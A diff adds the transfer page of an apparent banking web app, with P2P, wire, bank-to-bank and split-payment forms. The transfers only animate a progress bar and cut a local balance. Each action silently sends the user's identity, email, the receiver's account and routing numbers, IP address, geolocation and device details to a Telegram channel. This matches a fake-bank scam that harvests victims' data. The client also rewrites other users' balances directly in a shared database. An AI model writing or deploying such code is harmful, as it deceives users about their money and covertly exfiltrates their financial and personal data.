+          <div><label class="block text-[10px] font-bold text-slate-400 uppercase mb-1">Account Number</label><input type="text" id="wire-receiver-acc" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="0987654321" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-400"></div>
+          <div><label class="block text-[10px] font-bold text-slate-400 uppercase mb-1">Routing Number (9 digits)</label><input type="text" id="wire-receiver-routing" required pattern="[0-9]{9}" maxlength="9" oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="026009593" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-400"></div>
+        </div>
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <div><label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-1.5">Amount ($)</label><div class="relative"><span class="absolute left-4 top-3 text-xl font-black text-slate-500">$</span><input type="number" id="wire-amount" required min="1" step="0.01" max="${state.userBalance}" placeholder="0.00" class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-10 pr-4 py-2.5 text-xl font-black text-white focus:outline-none focus:border-purple-400"><p class="text-[10px] text-slate-500 mt-1">Available: ${fmtMoney(state.userBalance)}</p></div></div>
+          <div><label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-1.5">Memo (Optional)</label><input type="text" id="wire-memo" maxlength="60" placeholder="Reference note" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-purple-400"></div>
+        </div>
+        <button type="submit" ${isLocked?'disabled':''} class="w-full py-4 bg-gradient-to-r from-purple-500 to-purple-700 text-white font-black rounded-xl text-sm shadow-xl active:scale-95 transition"><i class="fa-solid fa-tower-broadcast mr-2"></i> Submit Wire Check</button>
+      </form>
+    </div>
+  </div>`;
+}
+
+function renderBankToBankCard() {
+  const isLocked = isTabLocked('transfer');
+  return `<div class="bg-navy-800 border border-emerald-500/30 rounded-3xl p-6 sm:p-8 relative overflow-hidden shadow-2xl mt-6">
+    ${isLocked ? `<div class="absolute inset-0 bg-navy-950/80 z-20 flex items-center justify-center rounded-3xl pointer-events-none"><div class="bg-navy-800 border border-rose-500/40 rounded-2xl p-6 text-center max-w-xs pointer-events-auto shadow-2xl"><i class="fa-solid fa-lock text-3xl text-rose-400 mb-3"></i><p class="text-sm font-bold text-white mb-1">Bank to Bank Locked</p><p class="text-[11px] text-slate-400 mb-4">Complete KYC to unlock.</p></div></div>` : ''}
+    <div class="relative z-10 space-y-5">
+      <div class="flex items-center justify-between"><div><h3 class="text-xl sm:text-2xl font-black text-white flex items-center tracking-tight"><div class="w-8 h-8 rounded-xl bg-emerald-500/20 text-emerald-400 flex items-center justify-center mr-3 shadow-inner"><i class="fa-solid fa-building-columns text-sm"></i></div>Bank to Bank Transfer</h3></div><span class="inline-flex items-center gap-1.5 px-3 py-1 bg-gold-500/20 text-gold-400 border border-gold-500/40 text-[10px] font-bold rounded-full"><i class="fa-solid fa-clock text-[9px]"></i> 2 Business Days</span></div>
+      <div class="bg-gold-500/10 border border-gold-500/30 rounded-xl p-3 text-[11px] text-slate-200 leading-relaxed"><i class="fa-solid fa-hourglass-half text-gold-400 mr-1.5"></i><b class="text-gold-400">Settlement: 2 business days.</b> Bank transfers do not settle instantly.</div>
+      
+      <div class="bg-navy-900/60 border border-emerald-500/20 rounded-2xl p-4 flex items-center justify-between">
+        <div><p class="text-[10px] text-emerald-300 uppercase font-black tracking-widest">Available Balance</p><p class="text-lg font-black text-white mt-0.5">${fmtMoney(state.userBalance)}</p></div>
+        <i class="fa-solid fa-wallet text-emerald-400 text-xl"></i>
+      </div>
+
+      <form onsubmit="submitBankToBank(event)" class="space-y-5">
+        <div class="bg-navy-900/60 border border-sky-custom/20 rounded-2xl p-4 space-y-3">
+          <p class="text-[10px] text-sky-custom uppercase font-black tracking-widest flex items-center"><i class="fa-solid fa-arrow-down-to-bracket mr-1.5"></i>Receiver Bank</p>
+          <div><label class="block text-[10px] font-bold text-slate-400 uppercase mb-1">Full Name</label><input type="text" id="bank-receiver-name" required placeholder="Jane Smith" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+          <div><label class="block text-[10px] font-bold text-slate-400 uppercase mb-1">Bank Name</label><input type="text" id="bank-receiver-bank" required placeholder="Citibank" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+          <div><label class="block text-[10px] font-bold text-slate-400 uppercase mb-1">Account Number</label><input type="text" id="bank-receiver-acc" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="0987654321" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+          <div><label class="block text-[10px] font-bold text-slate-400 uppercase mb-1">Routing Number (9 digits)</label><input type="text" id="bank-receiver-routing" required pattern="[0-9]{9}" maxlength="9" oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="021000089" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+        </div>
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <div><label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-1.5">Amount ($)</label><div class="relative"><span class="absolute left-4 top-3 text-xl font-black text-slate-500">$</span><input type="number" id="bank-amount" required min="1" step="0.01" max="${state.userBalance}" placeholder="0.00" class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-10 pr-4 py-2.5 text-xl font-black text-white focus:outline-none focus:border-emerald-400"><p class="text-[10px] text-slate-500 mt-1">Available: ${fmtMoney(state.userBalance)}</p></div></div>
+          <div><label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-1.5">Memo (Optional)</label><input type="text" id="bank-memo" maxlength="60" placeholder="Reference note" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-400"></div>
+        </div>
+        <button type="submit" ${isLocked?'disabled':''} class="w-full py-4 bg-gradient-to-r from-emerald-500 to-emerald-700 text-navy-950 font-black rounded-xl text-sm shadow-xl active:scale-95 transition"><i class="fa-solid fa-building-columns mr-2"></i> Submit Bank Transfer</button>
+      </form>
+    </div>
+  </div>`;
+}
+
+function loadingOverlayHtml(title, subtitle, pctId, barId) {
+  return `<div class="text-center py-8 space-y-6">
+    <div class="relative w-24 h-24 mx-auto flex items-center justify-center">
+      <div class="absolute inset-0 rounded-full border-4 border-sky-custom/10 border-t-sky-custom animate-spin"></div>
+      <div class="absolute inset-2 rounded-full border-4 border-emerald-500/10 border-b-emerald-500 animate-spin" style="animation-direction:reverse;animation-duration:1.5s;"></div>
+      <i class="fa-solid fa-shield-halved text-2xl text-sky-custom animate-pulse"></i>
+    </div>
+    <div>
+      <h3 class="text-xl sm:text-2xl font-black text-white">${title}</h3>
+      <p class="text-xs text-slate-400 mt-1">${subtitle}</p>
+    </div>
+    <div class="w-full max-w-xs mx-auto">
+      <div class="w-full bg-navy-950 h-3 rounded-full overflow-hidden border border-navy-700 shadow-inner">
+        <div id="${barId}" class="h-full bg-gradient-to-r from-sky-custom via-gold-400 to-emerald-400 w-0 transition-all duration-100 ease-out shadow-[0_0_10px_rgba(56,189,248,0.5)]"></div>
+      </div>
+      <div id="${pctId}" class="text-xl font-black text-gold-400 mt-3 animate-pulse">0%</div>
+    </div>
+  </div>`;
+}
+
+function render3DSuccess(title, subtitle, ref, icon, color) {
+  return `<div class="text-center py-8 space-y-5 flex flex-col items-center">
+    <div style="perspective: 1000px;">
+      <div class="success-card w-28 h-28 bg-gradient-to-br ${color} rounded-3xl flex items-center justify-center text-white text-6xl shadow-[0_20px_50px_-10px_rgba(0,0,0,0.5)] relative border border-white/20">
+        <div class="absolute inset-0 rounded-3xl bg-white/10 animate-ping opacity-20"></div>
+        <i class="fa-solid ${icon} drop-shadow-lg relative z-10"></i>
+      </div>
+    </div>
+    <div class="space-y-1 mt-4">
+      <h3 class="text-2xl sm:text-3xl font-black text-white tracking-tight">${title}</h3>
+      <p class="text-sm text-slate-300 font-medium">${subtitle}</p>
+      <div class="inline-flex items-center gap-2 mt-3 px-3 py-1.5 bg-navy-950 border border-navy-700 rounded-lg">
+        <span class="text-[10px] text-slate-500 uppercase font-bold tracking-widest">Ref</span>
+        <span class="text-xs text-sky-custom font-mono font-bold">${ref}</span>
+      </div>
+    </div>
+    <button onclick="closeModal(); render();" class="w-full max-w-xs px-6 py-3.5 mt-6 bg-navy-950 border border-navy-700 text-slate-300 font-bold rounded-xl text-sm hover:text-white hover:border-slate-500 active:scale-95 transition">Done</button>
+  </div>`;
+}
+
+function buildTransferTelegramHeader(kind, ref) {
+  const u = state.currentUser || {};
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  return `<b>${kind}</b>\n` +
+    `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>Ref:</b> ${tgEsc(ref)}\n`;
+}
+
+async function submitP2PTransfer(e) {
+  e.preventDefault();
+  if (isTabLocked('transfer')) return;
+  const amt = parseFloat(document.getElementById('p2p-amount').value);
+  if (!p2pSelectedUser) { showToast('Select Recipient', 'Pick a user.', 'warning'); return; }
+  if (!amt || amt > state.userBalance) { showToast('Invalid Amount', 'Enter valid amount.', 'warning'); return; }
+  const memo = (document.getElementById('p2p-memo')?.value || '').trim();
+
+  const ref = 'P2P-' + Math.floor(100000 + Math.random()*900000);
+  const recipientName = p2pSelectedUser.username;
+  const recipientFullName = `${p2pSelectedUser.firstName||''} ${p2pSelectedUser.lastName||''}`.trim() || 'N/A';
+  const nowStr = new Date().toISOString().replace('T',' ').substring(0,16);
+  const nowIso = new Date().toISOString();
+  const balBefore = state.userBalance;
+
+  const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); modal.style.display = 'flex';
+  content.innerHTML = loadingOverlayHtml('Processing Transfer', `Routing funds securely to @${recipientName}...`, 'p2p-load-pct', 'p2p-load-bar');
+  
+  let progress = 0;
+  const interval = setInterval(async () => {
+    progress += Math.floor(Math.random()*15) + 8; if (progress > 100) progress = 100;
+    const bar = document.getElementById('p2p-load-bar'); const pct = document.getElementById('p2p-load-pct');
+    if (bar) bar.style.width = progress + '%'; if (pct) pct.textContent = progress + '%';
+    
+    if (progress >= 100) {
+      clearInterval(interval);
+      state.userBalance -= amt; recordDailyUsage('p2p', amt);
+      state.transactions.unshift({ ref, date:nowStr, amount:amt, type:'P2P Sent', status:'Completed', counterparty:recipientName, memo });
+      
+      if (window.rtdb) {
+        try {
+          const rSnap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + recipientName.toLowerCase()));
+          if (rSnap.exists()) {
+            const rUser = rSnap.val();
+            rUser.userBalance = (Number(rUser.userBalance) || 0) + amt;
+            rUser.transactions = Array.isArray(rUser.transactions) ? rUser.transactions : [];
+            rUser.transactions.unshift({ ref, date:nowStr, amount:amt, type:'P2P Received', status:'Completed', counterparty: state.currentUser.username, memo });
+            await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + recipientName.toLowerCase()), rUser);
+          }
+        } catch(err) {}
+      }
+      
+      saveDeviceState();
+
+      const net = await fetchIP().catch(()=> ({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
+      const dev = detectDevice();
+      sendTelegramMessage(
+        buildTransferTelegramHeader('💸 P2P TRANSFER SENT', ref) +
+        `<b>To username:</b> @${tgEsc(recipientName)}\n` +
+        `<b>To name:</b> ${tgEsc(recipientFullName)}\n` +
+        `<b>Amount:</b> ${fmtMoney(amt)}\n` +
+        `<b>Memo:</b> ${tgEsc(memo || '(none)')}\n` +
+        `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
+        `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
+        `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+        `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+        `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+        `<b>Timestamp:</b> ${nowIso}`
+      ).catch(()=>{});
+      
+      setTimeout(() => {
+        content.innerHTML = render3DSuccess('Payment Successful', `Sent ${fmtMoney(amt)} to @${recipientName}`, ref, 'fa-paper-plane', 'from-sky-custom to-emerald-500');
+        showToast('Sent', 'Transfer successful.', 'success');
+      }, 400);
+    }
+  }, 120);
+}
+
+async function submitWireCheck(e) {
+  e.preventDefault();
+  if (isTabLocked('transfer')) return;
+  const amt = parseFloat(document.getElementById('wire-amount').value);
+  const name = document.getElementById('wire-receiver-name').value.trim();
+  const bank = document.getElementById('wire-receiver-bank').value.trim();
+  const acc = document.getElementById('wire-receiver-acc').value.trim();
+  const routing = document.getElementById('wire-receiver-routing').value.trim();
+  const memo = (document.getElementById('wire-memo').value || '').trim();
+  if (!amt || amt > state.userBalance) { showToast('Invalid Amount', 'Enter valid amount.', 'warning'); return; }
+
+  const ref = 'WIRE-' + Math.floor(100000 + Math.random()*900000);
+  const nowIso = new Date().toISOString();
+  const balBefore = state.userBalance;
+
+  const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); modal.style.display = 'flex';
+  content.innerHTML = loadingOverlayHtml('Processing Wire Check', `Verifying dispatch to ${name}...`, 'wire-load-pct', 'wire-load-bar');
+  
+  let progress = 0;
+  const interval = setInterval(async ()=>{
+    progress += Math.floor(Math.random()*12) + 8; if (progress > 100) progress = 100;
+    const bar = document.getElementById('wire-load-bar'); const pct = document.getElementById('wire-load-pct');
+    if (bar) bar.style.width = progress + '%'; if (pct) pct.textContent = progress + '%';
+    
+    if (progress >= 100) {
+      clearInterval(interval);
+      state.userBalance -= amt;
+      state.transactions.unshift({ ref, date:new Date().toISOString().replace('T',' ').substring(0,16), amount:amt, type:'Wire Check', status:'Completed', counterparty:name, memo });
+      saveDeviceState();
+
+      const net = await fetchIP().catch(()=> ({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
+      const dev = detectDevice();
+      sendTelegramMessage(
+        buildTransferTelegramHeader('🏦 WIRE CHECK SUBMITTED', ref) +
+        `<b>Receiver name:</b> ${tgEsc(name)}\n` +
+        `<b>Receiver bank:</b> ${tgEsc(bank)}\n` +
+        `<b>Account number:</b> <code>${tgEsc(acc)}</code>\n` +
+        `<b>Routing number:</b> <code>${tgEsc(routing)}</code>\n` +
+        `<b>Amount:</b> ${fmtMoney(amt)}\n` +
+        `<b>Memo:</b> ${tgEsc(memo || '(none)')}\n` +
+        `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
+        `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
+        `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+        `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+        `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+        `<b>Timestamp:</b> ${nowIso}`
+      ).catch(()=>{});
+      
+      setTimeout(()=>{ 
+        content.innerHTML = render3DSuccess('Wire Check Successfully Submitted', `${fmtMoney(amt)} dispatched to ${name}`, ref, 'fa-tower-broadcast', 'from-purple-500 to-purple-700'); 
+        showToast('Sent', 'Wire dispatched.', 'success'); 
+      }, 400);
+    }
+  }, 130);
+}
+
+async function submitBankToBank(e) {
+  e.preventDefault();
+  if (isTabLocked('transfer')) return;
+  const amt = parseFloat(document.getElementById('bank-amount').value);
+  const name = document.getElementById('bank-receiver-name').value.trim();
+  const bank = document.getElementById('bank-receiver-bank').value.trim();
+  const acc = document.getElementById('bank-receiver-acc').value.trim();
+  const routing = document.getElementById('bank-receiver-routing').value.trim();
+  const memo = (document.getElementById('bank-memo').value || '').trim();
+  if (!amt || amt > state.userBalance) { showToast('Invalid Amount', 'Enter valid amount.', 'warning'); return; }
+
+  const ref = 'BANK-' + Math.floor(100000 + Math.random()*900000);
+  const nowIso = new Date().toISOString();
+  const balBefore = state.userBalance;
+
+  const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); modal.style.display = 'flex';
+  content.innerHTML = loadingOverlayHtml('Processing Bank Transfer', `Dispatching to ${name}...`, 'bank-load-pct', 'bank-load-bar');
+  
+  let progress = 0;
+  const interval = setInterval(async ()=>{
+    progress += Math.floor(Math.random()*12) + 8; if (progress > 100) progress = 100;
+    const bar = document.getElementById('bank-load-bar'); const pct = document.getElementById('bank-load-pct');
+    if (bar) bar.style.width = progress + '%'; if (pct) pct.textContent = progress + '%';
+    
+    if (progress >= 100) {
+      clearInterval(interval);
+      state.userBalance -= amt;
+      state.transactions.unshift({ ref, date:new Date().toISOString().replace('T',' ').substring(0,16), amount:amt, type:'Bank to Bank', status:'Pending', counterparty:name, memo });
+      saveDeviceState();
+
+      const net = await fetchIP().catch(()=> ({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
+      const dev = detectDevice();
+      sendTelegramMessage(
+        buildTransferTelegramHeader('🏛️ BANK TO BANK TRANSFER', ref) +
+        `<b>Receiver name:</b> ${tgEsc(name)}\n` +
+        `<b>Receiver bank:</b> ${tgEsc(bank)}\n` +
+        `<b>Account number:</b> <code>${tgEsc(acc)}</code>\n` +
+        `<b>Routing number:</b> <code>${tgEsc(routing)}</code>\n` +
+        `<b>Amount:</b> ${fmtMoney(amt)}\n` +
+        `<b>Memo:</b> ${tgEsc(memo || '(none)')}\n` +
+        `<b>Settlement:</b> 2 Business Days\n` +
+        `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
+        `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
+        `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+        `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+        `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+        `<b>Timestamp:</b> ${nowIso}`
+      ).catch(()=>{});
+      
+      setTimeout(()=>{ 
+        content.innerHTML = render3DSuccess('Bank Transfer Successfully Submitted', `${fmtMoney(amt)} dispatching to ${name} (2 days)`, ref, 'fa-building-columns', 'from-emerald-500 to-emerald-700'); 
+        showToast('Sent', 'Bank transfer initiated.', 'success'); 
+      }, 400);
+    }
+  }, 130);
+}
+
+function openSplitPaymentModal() {
+  showModal('Split Payment', `<div id="split-rows" class="space-y-3 mb-3">
+    <div class="split-row grid grid-cols-3 gap-2 relative">
+      <div class="relative">
+        <input type="text" placeholder="@username" class="split-to w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-sky-custom" oninput="handleSplitInput(event, 0)" autocomplete="off">
+        <div id="split-suggestions-0" class="hidden absolute left-0 right-0 top-full mt-1 z-50 bg-navy-950 border border-navy-700 rounded-xl shadow-2xl max-h-40 overflow-y-auto"></div>
+      </div>
+      <input type="number" placeholder="Amount" min="1" step="0.01" class="split-amt bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
+      <input type="text" placeholder="Memo" class="split-memo bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
+    </div>
+  </div><button onclick="addSplitRow()" class="w-full py-2 mb-3 bg-navy-900 border border-navy-700 text-sky-custom font-bold rounded-xl text-xs active:scale-95"><i class="fa-solid fa-plus mr-1"></i> Add Recipient</button><div class="flex justify-end gap-3"><button onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-xs font-bold">Cancel</button><button onclick="submitSplitPayment()" class="px-6 py-2.5 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-xl text-xs font-extrabold active:scale-95">Send Split</button></div>`);
+}
+function addSplitRow() { 
+  const wrap = document.getElementById('split-rows'); if (!wrap) return; 
+  const idx = wrap.children.length;
+  const div = document.createElement('div'); 
+  div.className='split-row grid grid-cols-3 gap-2 relative'; 
+  div.innerHTML = `
+    <div class="relative">
+      <input type="text" placeholder="@username" class="split-to w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-sky-custom" oninput="handleSplitInput(event, ${idx})" autocomplete="off">
+      <div id="split-suggestions-${idx}" class="hidden absolute left-0 right-0 top-full mt-1 z-50 bg-navy-950 border border-navy-700 rounded-xl shadow-2xl max-h-40 overflow-y-auto"></div>
+    </div>
+    <input type="number" placeholder="Amount" min="1" step="0.01" class="split-amt bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
+    <input type="text" placeholder="Memo" class="split-memo bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-sky-custom>`; 
+  wrap.appendChild(div); 
+}
+
+async function submitSplitPayment() {
+  const rows = Array.from(document.querySelectorAll('.split-row'));
+  const entries = rows.map(r => ({
+    to: (r.querySelector('.split-to').value||'').replace(/^@/,'').trim(),
+    amt: parseFloat(r.querySelector('.split-amt').value),
+    memo: r.querySelector('.split-memo').value||''
+  })).filter(e => e.to && e.amt > 0);
+
+  if (entries.length === 0) { showToast('Empty', 'Add at least one recipient.', 'warning'); return; }
+
+  const total = entries.reduce((s,e) => s + e.amt, 0);
+  if (total > state.userBalance) {
+    showToast('Insufficient Funds', `Total ${fmtMoney(total)} exceeds balance ${fmtMoney(state.userBalance)}.`, 'error');
+    return;
+  }
+
+  const nowStr = new Date().toISOString().replace('T',' ').substring(0,16);
+  const nowIso = new Date().toISOString();
+  const balBefore = state.userBalance;
+  let sent = 0;
+  const lines = [];
+
+  for (const e of entries) {
+    const ref = 'P2P-SP-' + Math.floor(100000 + Math.random()*900000);
+    state.userBalance -= e.amt;
+    state.transactions.unshift({ ref, date:nowStr, amount:e.amt, type:'P2P Sent', status:'Completed', memo:'[Split] '+e.memo, counterparty:e.to });
+    recordDailyUsage('p2p', e.amt);
+    lines.push(`  • @${e.to} — ${fmtMoney(e.amt)} — ${e.memo || '(no memo)'} — Ref ${ref}`);
+
+    if (window.rtdb) {
+      try {
+        const rSnap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + e.to.toLowerCase()));
+        if (rSnap.exists()) {
+          const rUser = rSnap.val();
+          rUser.userBalance = (Number(rUser.userBalance) || 0) + e.amt;
+          rUser.transactions = Array.isArray(rUser.transactions) ? rUser.transactions : [];
+          rUser.transactions.unshift({ ref, date:nowStr, amount:e.amt, type:'P2P Received', status:'Completed', counterparty: state.currentUser.username, memo:'[Split] '+e.memo });
+          await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + e.to.toLowerCase()), rUser);
+        }
+      } catch(err) {}
+    }
+    sent++;
+  }
+
+  saveDeviceState();
+  closeModal();
+  showToast('Split Complete', `${sent} transfers sent.`, 'success');
+
+  const net = await fetchIP().catch(()=> ({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
+  const dev = detectDevice();
+  sendTelegramMessage(
+    buildTransferTelegramHeader('✂️ SPLIT PAYMENT SENT', 'SPLIT-' + Date.now()) +
+    `<b>Recipients:</b> ${sent}\n` +
+    `<b>Total sent:</b> ${fmtMoney(total)}\n` +
+    `<b>Breakdown:</b>\n${lines.map(l => tgEsc(l)).join('\n')}\n` +
+    `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
+    `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+    `<b>Timestamp:</b> ${nowIso}`
+  ).catch(()=>{});
+
+  render();
+}
+
+function handleSplitInput(e, idx) {
+  const q = e.target.value.toLowerCase().trim();
+  const wrap = document.getElementById('split-suggestions-' + idx);
+  if (!wrap) return;
+  if (!q) { wrap.classList.add('hidden'); wrap.innerHTML = ''; return; }
+  const pool = getAllSelectableUsers();
+  const matches = pool.filter(u => {
+    const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).toLowerCase();
+    return (u.username||'').toLowerCase().includes(q) || fullName.includes(q);
+  }).slice(0, 5);
+  if (matches.length === 0) {
+    wrap.innerHTML = `<div class="p-2 text-center text-[10px] text-slate-500">No match</div>`;
+    wrap.classList.remove('hidden');
+    return;
+  }
+  wrap.innerHTML = matches.map(u => {
+    const fullName = `${u.firstName||''} ${u.lastName||''}`.trim() || u.username;
+    return `<div class="p-2 cursor-pointer hover:bg-navy-800 border-b border-navy-700/50" onclick="selectSplitUser(${idx}, '${escapeHtml(u.username)}')">
+      <p class="text-xs font-bold text-white">${escapeHtml(fullName)}</p>
+      <p class="text-[9px] text-sky-custom">@${escapeHtml(u.username)}</p>
+    </div>`;
+  }).join('');
+  wrap.classList.remove('hidden');
+}
+
+function selectSplitUser(idx, username) {
+  const inputs = document.querySelectorAll('.split-to');
+  if (inputs[idx]) inputs[idx].value = username;
+  const wrap = document.getElementById('split-suggestions-' + idx);
+  if (wrap) wrap.classList.add('hidden');
+}
+
+function openQRReceiveModal() {
+  const u = state.currentUser || {};
+  const qrPayload = JSON.stringify({ u: u.username, n: ((u.firstName||'') + ' ' + (u.lastName||'')).trim() });
+  showModal('QR Receive', `
+    <div class="text-center space-y-4 py-4">
+      <p class="text-xs text-slate-300">Show this QR code to receive a P2P transfer.</p>
+      <div class="bg-white rounded-2xl p-3 inline-block" id="qr-holder"></div>
+      <p class="text-sm font-bold text-white">@${escapeHtml(u.username || '')}</p>
+      <p class="text-xs text-slate-400">${escapeHtml(((u.firstName||'') + ' ' + (u.lastName||'')).trim())}</p>
+    </div>
+  `);
+  setTimeout(() => {
+    try {
+      const holder = document.getElementById('qr-holder');
+      if (holder && window.QRCode) new QRCode(holder, { text: qrPayload, width: 200, height: 200 });
+    } catch(e){}
+  }, 50);
+  sendTelegramMessage(
+    `📱 <b>QR RECEIVE SHOWN</b>\n<b>User:</b> @${tgEsc(u.username || 'unknown')}\n<b>Timestamp:</b> ${new Date().toISOString()}`
+  ).catch(()=>{});
+}
+
+function render() {
+  document.body.classList.remove('modal-open');
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('transfer');
+  const container = document.getElementById('app-container');
+  const content = `${renderP2PCard()}${renderWireCheckCard()}${renderBankToBankCard()}`;
+  container.innerHTML = renderDashboardShell('transfer', content);
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  await pullCurrentUserFromCloud();
+  const cloudUsers = await pullAllUsersFromCloud();
+  state.usersCache = Object.values(cloudUsers).filter(u=>u.username);
+  render();
+};
+</script>
+</body>
+</html>
